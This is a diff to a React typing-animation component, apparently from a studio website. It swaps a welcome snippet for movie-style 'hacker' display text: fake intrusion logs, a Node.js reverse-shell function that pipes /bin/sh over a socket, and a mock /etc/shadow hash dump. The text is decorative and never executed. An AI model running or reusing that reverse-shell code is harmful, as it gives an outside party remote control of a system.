@@ -4,31 +4,39 @@
 import { useState, useEffect, useRef } from 'react';
 import { gsap } from 'gsap';
 
-const codeSnippet = `import React from 'react';
-import { Button } from '@/components/ui/button';
+const codeSnippet = `[~] Initializing system analysis...
+[+] Connecting to secure server: 192.168.1.101...
+[+] Connection established.
+[~] Bypassing firewall...
+[!] Firewall bypassed. Access granted.
 
-const WelcomeComponent = () => {
-  return (
-    <div className="p-8 text-center">
-      <h1 className="text-4xl font-bold mb-4">
-        Welcome to Studio Noir
-      </h1>
-      <p className="text-lg text-muted-foreground mb-8">
-        Crafting digital experiences.
-      </p>
-      <Button>Get In Touch</Button>
-    </div>
-  );
-};
+// Spawning reverse shell...
+void function connect_back(host, port) {
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(port, host, function() {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return;
+}();
 
-export default WelcomeComponent;
+[~] Executing payload...
+[+] System compromised. Root access obtained.
+> Accessing /etc/shadow...
+> Dumping password hashes...
+...
+root:$6$aReallyLongSalt$anotherLongString...
+daemon:*:19659:0:99999:7:::
+bin:*:19659:0:99999:7:::
+sys:*:19659:0:99999:7:::
 
-// Creative code in motion...
-function animate() {
-  requestAnimationFrame(animate);
-  // ... rendering logic
-}
-`;
+> Mission accomplished.
+> Erasing tracks...
+> Disconnecting.`;
 
 const CodeTypingEffect = () => {
   const [text, setText] = useState('');
